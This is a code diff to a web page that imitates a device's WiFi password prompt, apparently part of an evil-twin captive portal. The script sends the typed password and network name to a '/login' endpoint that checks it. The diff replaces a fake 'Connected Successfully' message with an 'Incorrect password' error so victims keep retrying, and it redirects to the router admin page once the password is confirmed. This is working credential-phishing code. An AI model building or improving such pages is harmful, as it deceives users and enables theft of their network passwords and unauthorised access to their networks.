@@ -356,6 +356,8 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
 .password-input{width:100%;background:transparent;border:none;border-bottom:1px solid #3a3a3a;padding:10px 35px 10px 0;font-size:16px;color:#fff;outline:none;font-family:inherit}
 .password-input:focus{border-bottom-color:#4a90e2}
 .password-input::placeholder{color:#5a5a5a}
+.error-msg{color:#e53935;font-size:12px;margin-top:5px;display:none}
+.error-msg.show{display:block}
 .eye-icon{position:absolute;right:0;top:50%;transform:translateY(-50%);width:24px;height:24px;cursor:pointer;display:flex;align-items:center;justify-content:center}
 .eye-icon svg{width:24px;height:24px;fill:#7a7a7a}
 .auto-reconnect{display:flex;justify-content:space-between;align-items:center;padding:15px 0;border-bottom:1px solid #2a2a2a}
@@ -370,7 +372,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
 .connect-btn:active{background:#3a6ba3}
 .connect-btn:disabled{background:#1a3a5c;color:#5a5a5a}
 .hidden{display:none}
-.success-msg{text-align:center;padding:40px 20px;color:#4caf50;font-size:18px}
 @media(min-width:768px){
 .wifi-page{max-width:500px;margin:0 auto;border:1px solid #2a2a2a}
 .header{border-top-left-radius:12px;border-top-right-radius:12px}
@@ -391,6 +392,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
 <div class="eye-icon" id="togglePassword">
 <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
 </div>
+<div class="error-msg" id="errorMsg">Incorrect password</div>
 </div>
 
 <div class="auto-reconnect">
@@ -407,11 +409,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
 </div>
 
 <button class="connect-btn" id="connectBtn">Connect</button>
-
-<div class="success-msg hidden" id="successMsg">
-<div style="font-size:48px;margin-bottom:10px">✓</div>
-<div>Connected Successfully</div>
-</div>
 </div>
 
 <script>
@@ -445,12 +442,18 @@ this.classList.toggle('active');
 document.getElementById('connectBtn').onclick=async function(){
 let password=document.getElementById('passwordInput').value;
 let ssid=document.getElementById('networkTitle').textContent;
+let errorMsg=document.getElementById('errorMsg');
 
 if(!password){
 document.getElementById('passwordInput').style.borderBottomColor='#e53935';
+errorMsg.textContent='Password is required';
+errorMsg.classList.add('show');
 return;
 }
 
+// Hide error and disable button
+errorMsg.classList.remove('show');
+document.getElementById('passwordInput').style.borderBottomColor='#3a3a3a';
 this.disabled=true;
 this.textContent='Connecting...';
 
@@ -462,36 +465,26 @@ try{
 let response=await fetch('/login',{method:'POST',body:formData});
 let data=await response.json();
 
-document.querySelector('.wifi-container').classList.add('hidden');
-document.querySelector('.connect-btn').classList.add('hidden');
-
 if(data.connected){
-// Password was correct, show real success
-document.getElementById('successMsg').innerHTML=`
-<div style="font-size:48px;margin-bottom:10px">✓</div>
-<div>Connected Successfully</div>
-<div style="font-size:14px;color:#7a7a7a;margin-top:10px">You are now connected to ${ssid}</div>
-`;
-}else{
-// Password was wrong, show generic message
-document.getElementById('successMsg').innerHTML=`
-<div style="font-size:48px;margin-bottom:10px">✓</div>
-<div>Connected Successfully</div>
-<div style="font-size:14px;color:#7a7a7a;margin-top:10px">Verifying connection...</div>
-`;
-}
-document.getElementById('successMsg').classList.remove('hidden');
-
-// If connected to real network, close dialog after 3 seconds
-if(data.connected){
+// Password CORRECT - Redirect to router admin (192.168.0.1 or 192.168.1.1)
+this.textContent='Connected';
 setTimeout(()=>{
-window.close();
-},3000);
+window.location.href='http://192.168.0.1';
+},1000);
+}else{
+// Password WRONG - Show error message
+this.disabled=false;
+this.textContent='Connect';
+document.getElementById('passwordInput').style.borderBottomColor='#e53935';
+errorMsg.textContent='Incorrect password';
+errorMsg.classList.add('show');
 }
 }catch(e){
 this.disabled=false;
 this.textContent='Connect';
 document.getElementById('passwordInput').style.borderBottomColor='#e53935';
+errorMsg.textContent='Connection failed';
+errorMsg.classList.add('show');
 }
 };
 
